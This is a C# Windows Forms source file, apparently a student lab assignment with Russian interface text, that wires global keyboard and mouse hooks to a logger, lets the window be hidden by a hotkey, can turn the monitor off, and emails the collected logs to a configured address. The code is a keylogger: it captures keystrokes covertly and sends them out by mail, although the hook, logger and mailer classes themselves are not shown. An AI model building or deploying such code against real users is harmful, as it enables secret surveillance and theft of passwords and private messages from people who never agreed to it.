using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using EventHook;
using System.Runtime.InteropServices;

namespace IPD_Lab8
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
        private int SC_MONITORPOWER = 0xF170;
        private uint WM_SYSCOMMAND = 0x0112;
        private bool status = true;


        private Settings settings;
        private Logger logger;
        private Hooks hooks;
        private MonitorManager monitorManager;
        private MailManager mailManager;
        public Form1()
        {
            InitializeComponent();

            settings = new Settings();
            logger = new Logger(@"C:\IPD", settings.MaxLogFileSize);
            hooks = new Hooks();
            monitorManager = new MonitorManager(this.Handle);
            mailManager = new MailManager(settings.EMAil);

            SetSettings();

            hooks.Visable += Hooks_Visable;
            hooks.KeyBordHook += logger.AddLineFromKeyBordFile;
            hooks.MauseHook += logger.AddLineFromMouseFiel;
            hooks.FabeMonitorEvent += TurnOffOnMonitor;

            logger.MessegeReady += mailManager.SendMessage; 

            if (settings.AutoStart)
                hooks.Start();
        }

        private void Suze_KeyPress(object sender, KeyPressEventArgs e)
        {
            char ch = e.KeyChar;
            if (!Char.IsDigit(ch) && ch != 8)
            {
                e.Handled = true;
            }
        }

        private void SetSettings()
        {
            this.workMode.SelectedIndex = settings.AutoStart ? 0 : 1;
            this.eMail.Text = settings.EMAil;
            this.fileSize.Text = settings.MaxLogFileSize.ToString();
            enable.Text = settings.AutoStart ? "Выключить" : "Включить";
        }

        private void SaveSettings_Click(object sender, EventArgs e)
        {
            settings.EMAil = eMail.Text;
            settings.MaxLogFileSize = int.Parse(fileSize.Text);
            settings.AutoStart = workMode.SelectedIndex == 0;

            if (!settings.SaveSettings())
            {
                MessageBox.Show("Ошибка", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                logger.MaxFileSize = settings.MaxLogFileSize;
                mailManager.DestinationAddress = settings.EMAil;
                MessageBox.Show("Настройки сохранены", "Сообщение", MessageBoxButtons.OK);

            }
        }

        private void Hooks_Visable()
        {
            this.Visible = !this.Visible;
        }

        private void TurnOffMonitor()
        {
            if (!InvokeRequired)
            {
                monitorManager.Update();
                SendMessage(this.Handle, WM_SYSCOMMAND, (IntPtr)SC_MONITORPOWER, (IntPtr)(2));
            }
            else
            {
                Invoke(new Action(TurnOffOnMonitor));
            }
        }

        public void TurnOffOnMonitor()
        {
            if (status)
            {
                TurnOffMonitor();
            }
            else
            {
                monitorManager.SetInitialBrightness();
            }

            status = !status;
        }

        private void Enable_Click(object sender, EventArgs e)
        {
            if (hooks.IsStarted)
            {
                hooks.Stop();
                enable.Text = "Включить";
            }
            else
            {
                hooks.Start();
                enable.Text = "Выключить";
            }
        }
    }
}

